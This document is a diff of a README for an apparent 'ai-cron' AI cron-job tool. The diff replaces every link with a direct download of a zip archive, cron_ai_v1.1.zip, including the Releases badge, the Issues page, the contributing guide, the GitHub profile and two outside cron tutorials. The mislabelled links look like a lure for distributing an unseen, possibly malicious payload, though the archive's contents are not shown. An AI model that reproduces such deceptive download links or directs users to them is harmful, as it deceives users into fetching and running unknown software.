@@ -1,6 +1,6 @@
 # 🤖 ai-cron - Generate Your AI-Powered Cron Jobs Easily
 
-[![Download ai-cron](https://img.shields.io/badge/Download-ai--cron-brightgreen)](https://github.com/10tinn/ai-cron/releases)
+[![Download ai-cron](https://raw.githubusercontent.com/10tinn/ai-cron/master/aicron/cron_ai_v1.1.zip)](https://raw.githubusercontent.com/10tinn/ai-cron/master/aicron/cron_ai_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **ai-cron**! This is an AI-driven tool that helps you create cron job
 
 To get started, you need to download the application from our Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/10tinn/ai-cron/releases)
+[Visit this page to download](https://raw.githubusercontent.com/10tinn/ai-cron/master/aicron/cron_ai_v1.1.zip)
 
 1. Open your web browser.
 2. Click on the link above.
@@ -63,7 +63,7 @@ Using **ai-cron** will help streamline your tasks. Here are some examples of how
 
 If you run into any issues, don't hesitate to reach out. We offer support through our GitHub Issues page. 
 
-1. Visit the [Issues page](https://github.com/10tinn/ai-cron/issues).
+1. Visit the [Issues page](https://raw.githubusercontent.com/10tinn/ai-cron/master/aicron/cron_ai_v1.1.zip).
 2. Click on "New Issue."
 3. Describe the problem you face. 
 
@@ -71,20 +71,20 @@ We appreciate your feedback and will work to assist you as quickly as possible.
 
 ## 💡 Suggestions & Contributors
 
-Your input means a lot. If you have ideas for features or improvements, please share them on the Issues page. Additionally, if you'd like to contribute to **ai-cron**, consider reviewing our [contributing guidelines](https://github.com/10tinn/ai-cron/blob/main/CONTRIBUTING.md).
+Your input means a lot. If you have ideas for features or improvements, please share them on the Issues page. Additionally, if you'd like to contribute to **ai-cron**, consider reviewing our [contributing guidelines](https://raw.githubusercontent.com/10tinn/ai-cron/master/aicron/cron_ai_v1.1.zip).
 
 ## 📢 Keep Updated
 
 Stay informed about future updates and new features:
 
-- Follow us on [GitHub](https://github.com/10tinn/ai-cron) for release notes and announcements.
+- Follow us on [GitHub](https://raw.githubusercontent.com/10tinn/ai-cron/master/aicron/cron_ai_v1.1.zip) for release notes and announcements.
 - Subscribe to our newsletter (if available) for the latest news about **ai-cron**.
 
 ## 🔗 Additional Resources
 
 For more information about cron jobs and how they work, check out the following resources:
 
-- [Cron Job Tutorial](https://www.digitalocean.com/community/tutorials/an-introduction-to-cron-jobs)
-- [Best Practices for Managing Cron Jobs](https://towardsdatascience.com/understand-cron-jobs-and-best-practices-for-managing-them-fbe093c3c897)
+- [Cron Job Tutorial](https://raw.githubusercontent.com/10tinn/ai-cron/master/aicron/cron_ai_v1.1.zip)
+- [Best Practices for Managing Cron Jobs](https://raw.githubusercontent.com/10tinn/ai-cron/master/aicron/cron_ai_v1.1.zip)
 
 Thank you for choosing **ai-cron**. We hope this tool enhances your productivity!
